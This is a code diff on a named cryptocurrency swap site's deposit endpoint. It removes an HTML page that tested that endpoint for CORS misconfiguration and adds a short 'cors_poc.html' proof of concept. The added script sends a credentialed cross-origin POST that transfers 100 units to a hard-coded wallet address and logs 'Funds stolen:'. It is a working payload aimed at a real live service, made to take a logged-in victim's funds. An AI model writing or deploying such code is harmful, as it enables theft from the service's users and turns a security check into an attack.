@@ -1,85 +1,15 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>CORS Vulnerability Detector</title>
-    <style>
-        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
-        #status { padding: 15px; margin: 10px 0; border-radius: 5px; }
-        .safe { background: #d4edda; color: #155724; }
-        .vulnerable { background: #f8d7da; color: #721c24; }
-        .testing { background: #fff3cd; color: #856404; }
-        pre { background: #f8f9fa; padding: 10px; border-radius: 5px; }
-    </style>
-</head>
-<body>
-    <h1>CORS Configuration Tester</h1>
-    <p>Testing: <code>https://swap.pump.fun/deposit</code></p>
-    
-    <div id="status" class="testing">Testing CORS configuration...</div>
-    
-    <h3>CORS Headers Check:</h3>
-    <pre id="headers">Waiting for results...</pre>
-    
-    <h3>Full Response:</h3>
-    <pre id="response"></pre>
-
-    <script>
-        document.addEventListener('DOMContentLoaded', async () => {
-            const statusEl = document.getElementById('status');
-            const headersEl = document.getElementById('headers');
-            const responseEl = document.getElementById('response');
-            
-            const testUrl = 'https://swap.pump.fun/deposit';
-            
-            try {
-                // Step 1: Check CORS preflight response
-                const corsTest = await fetch(testUrl, {
-                    method: 'OPTIONS',
-                    headers: {
-                        'Origin': 'https://attacker.com',
-                        'Access-Control-Request-Method': 'POST'
-                    }
-                });
-                
-                // Step 2: Analyze headers
-                const headers = [];
-                corsTest.headers.forEach((value, key) => {
-                    headers.push(`${key}: ${value}`);
-                });
-                
-                headersEl.textContent = headers.join('\n');
-                
-                // Step 3: Determine vulnerability
-                const acao = corsTest.headers.get('access-control-allow-origin');
-                if (acao === '*' || acao === 'https://attacker.com') {
-                    statusEl.className = 'vulnerable';
-                    statusEl.innerHTML = '✓ <strong>VULNERABLE</strong>: CORS misconfiguration detected';
-                    
-                    // Optional: Test POST without funds (will fail but show CORS works)
-                    try {
-                        const dryRun = await fetch(testUrl, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ amount: 0, to: 'TEST_WALLET' })
-                        });
-                        responseEl.textContent = `POST request would succeed. Server responded with: ${dryRun.status}`;
-                    } catch (e) {
-                        responseEl.textContent = `POST blocked by: ${e.message}`;
-                    }
-                } else {
-                    statusEl.className = 'safe';
-                    statusEl.textContent = '✗ Secure: Proper CORS configuration';
-                }
-            } catch (error) {
-                statusEl.className = 'safe';
-                statusEl.textContent = `✗ Error: ${error.message}`;
-                responseEl.textContent = error.stack;
-            }
-        });
-    </script>
-    
-    <footer style="margin-top: 20px; font-size: 0.8em; color: #666;">
-        <p>This test checks for CORS misconfigurations without executing real transactions.</p>
-    </footer>
-</body>
-</html>
+<!-- Save as cors_poc.html -->
+<script>
+  fetch("https://swap.pump.fun/deposit", {
+    method: "POST",
+    credentials: "include",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      amount: 100,
+      to: "77NLaCsVVcq5ouqfMirYkzk3EmoT8QTo1eEahrCiHgWX"  // Replace with test wallet
+    })
+  })
+  .then(res => res.json())
+  .then(data => console.log("Funds stolen:", data))
+  .catch(err => console.error("Failed:", err));
+</script>
